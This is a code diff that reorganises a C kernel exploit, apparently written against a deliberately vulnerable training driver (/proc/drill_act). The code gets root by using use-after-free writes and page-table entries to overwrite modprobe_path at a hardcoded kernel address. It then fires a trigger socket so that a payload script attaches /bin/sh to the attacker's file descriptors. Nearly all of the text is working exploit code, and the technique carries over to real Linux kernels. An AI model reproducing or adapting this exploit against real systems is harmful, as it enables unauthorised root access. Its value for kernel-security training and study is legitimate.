@@ -100,10 +100,6 @@ int act(int act_fd, int code, int n, char *args)
 #define OBJS_PER_SLAB 42
 #define CPU_PARTIAL 120
 
-/* Update the address of modprobe_path for your kernel: */
-#define MODPROBE_PATH_ADDR 0xffffffff835ccc60lu
-#define MODPROBE_PATH_ADDR_PART (MODPROBE_PATH_ADDR & 0xffff000lu)
-
 #define ENTRIES_AMOUNT 512 /* standart for any pagetable */
 #define PHYS_AREA 0x1000 /* regular page */
 #define PT_FLAGS 0x67 /* RW access for normal users and some sanity flags */
@@ -119,10 +115,74 @@ int act(int act_fd, int code, int n, char *args)
 		_pte_index_to_virt((unsigned long long)(page_index)) + \
 		(unsigned long long)(byte_index)))
 
+int prepare_page_tables()
+{
+	/* prepare infra */
+	void *retv = mmap((void*)PTI_TO_VIRT(1, 0, 0, 0, 0), 0x1000, PROT_WRITE,
+					  MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+	*(unsigned int*)PTI_TO_VIRT(1, 0, 0, 0, 0) = 0xcafecafe;
+	if (retv == MAP_FAILED) {
+		perror("[-] mmap");
+		exit(EXIT_FAILURE);
+	}
+
+	/* pre-register new tables and entries */
+	for (unsigned long long i = 0; i < 512; i++) {
+		retv = mmap((void *)PTI_TO_VIRT(1, 0, 1, i, 0), 0x1000, PROT_WRITE,
+					MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+	}
+	if (retv == MAP_FAILED) {
+		perror("[-] mmap");
+		exit(EXIT_FAILURE);
+	}
+	printf("[+] done, PTE is ready for allocation\n");
+
+	return 0;
+}
+
+/* Update the address of modprobe_path for your kernel: */
+#define MODPROBE_PATH_ADDR 0xffffffff835ccc60lu
+#define MODPROBE_PATH_ADDR_PART (MODPROBE_PATH_ADDR & 0xffff000lu)
+
 #define KMOD_PATH_LEN 256  /* default */
 #define FLUSH_STAT_INPROGRESS 0
 #define FLUSH_STAT_DONE 1
 #define SLEEPLOCK(cmp) while (cmp) { usleep(10 * 1000); }
+
+long read_file(const char *filename, void *buf, size_t buflen)
+{
+	long fd;
+	long retv;
+
+	fd = open(filename, O_RDONLY);
+	if (fd < 0) {
+		perror("[-] open");
+		exit(EXIT_FAILURE);
+	}
+
+	retv = read(fd, buf, buflen);
+	if (retv < 0) {
+		perror("[-] read");
+		exit(EXIT_FAILURE);
+	}
+	close(fd);
+
+	return retv;
+}
+
+static long get_modprobe_path(char *buf, size_t buflen)
+{
+	long size;
+
+	size = read_file("/proc/sys/kernel/modprobe", buf, buflen);
+	if (size == buflen)
+		printf("[!] read max amount of modprobe_path bytes, perhaps increment KMOD_PATH_LEN?\n");
+	buf[size-1] = '\x00'; /* cleanup line end */
+	printf("[+] current modprobe path: %s\n", buf);
+
+	return size;
+}
+
 
 #define PAYLOAD "#!/bin/sh\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n"
 
@@ -174,27 +234,6 @@ void modprobe_trigger_sock(void)
 		bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));
 }
 
-long read_file(const char *filename, void *buf, size_t buflen)
-{
-	long fd;
-	long retv;
-
-	fd = open(filename, O_RDONLY);
-	if (fd < 0) {
-		perror("[-] open");
-		exit(EXIT_FAILURE);
-	}
-
-	retv = read(fd, buf, buflen);
-	if (retv < 0) {
-		perror("[-] read");
-		exit(EXIT_FAILURE);
-	}
-	close(fd);
-
-	return retv;
-}
-
 /* The exploit can work without it, but will be less reliable */
 static void flush_tlb(void *addr, size_t len)
 {
@@ -217,31 +256,6 @@ static void flush_tlb(void *addr, size_t len)
 	munmap(status, sizeof(short));
 }
 
-int prepare_tables()
-{
-	/* prepare infra */
-	void *retv = mmap((void*)PTI_TO_VIRT(1, 0, 0, 0, 0), 0x1000, PROT_WRITE,
-					  MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-	*(unsigned int*)PTI_TO_VIRT(1, 0, 0, 0, 0) = 0xcafecafe;
-	if (retv == MAP_FAILED) {
-		perror("[-] mmap");
-		exit(EXIT_FAILURE);
-	}
-
-	/* pre-register new tables and entries */
-	for (unsigned long long i = 0; i < 512; i++) {
-		retv = mmap((void *)PTI_TO_VIRT(1, 0, 1, i, 0), 0x1000, PROT_WRITE,
-					MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-	}
-	if (retv == MAP_FAILED) {
-		perror("[-] mmap");
-		exit(EXIT_FAILURE);
-	}
-	printf("[+] done, PTE is ready for allocation\n");
-
-	return 0;
-}
-
 long UAF_write(long phys_addr, long uaf_n, long act_fd)
 {
 	int ret;
@@ -257,19 +271,6 @@ long UAF_write(long phys_addr, long uaf_n, long act_fd)
 		exit(EXIT_FAILURE);
 
 	return 0;
-}
-
-static long get_modprobe_path(char *buf, size_t buflen)
-{
-	long size;
-
-	size = read_file("/proc/sys/kernel/modprobe", buf, buflen);
-	if (size == buflen)
-		printf("[!] read max amount of modprobe_path bytes, perhaps increment KMOD_PATH_LEN?\n");
-	buf[size-1] = '\x00'; /* cleanup line end */
-	printf("[+] current modprobe path: %s\n", buf);
-
-	return size;
 }
 
 static int strcmp_modprobe_path(char *new_str)
@@ -311,10 +312,16 @@ int main(void)
 	long current_n = 0;
 	long reserved_from_n = 0;
 	long uaf_n = 0;
+	char modprobe_path[KMOD_PATH_LEN] = { 0 };
+	size_t modprobe_path_len = 0;
 	void *modprobe_addr;
-	char modprobe_path[KMOD_PATH_LEN] = { '\x00' };
 
 	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());
+
+	prepare_page_tables();
+
+	get_modprobe_path(modprobe_path, KMOD_PATH_LEN);
+	modprobe_path_len = strlen(modprobe_path);
 
 	act_fd = open("/proc/drill_act", O_WRONLY);
 	if (act_fd < 0) {
@@ -325,13 +332,6 @@ int main(void)
 
 	printf("[!] pin the process to a single CPU\n");
 	do_cpu_pinning();
-
-	/* extract modprobe before exploitation */
-	get_modprobe_path(modprobe_path, KMOD_PATH_LEN);
-	size_t modprobe_path_len = strlen(modprobe_path);
-
-	printf("[!] prepare the page table infrastructure\n");
-	prepare_tables();
 
 	printf("[!] create new active slab, allocate objs_per_slab objects\n");
 	for (i = 0; i < OBJS_PER_SLAB; i++) {
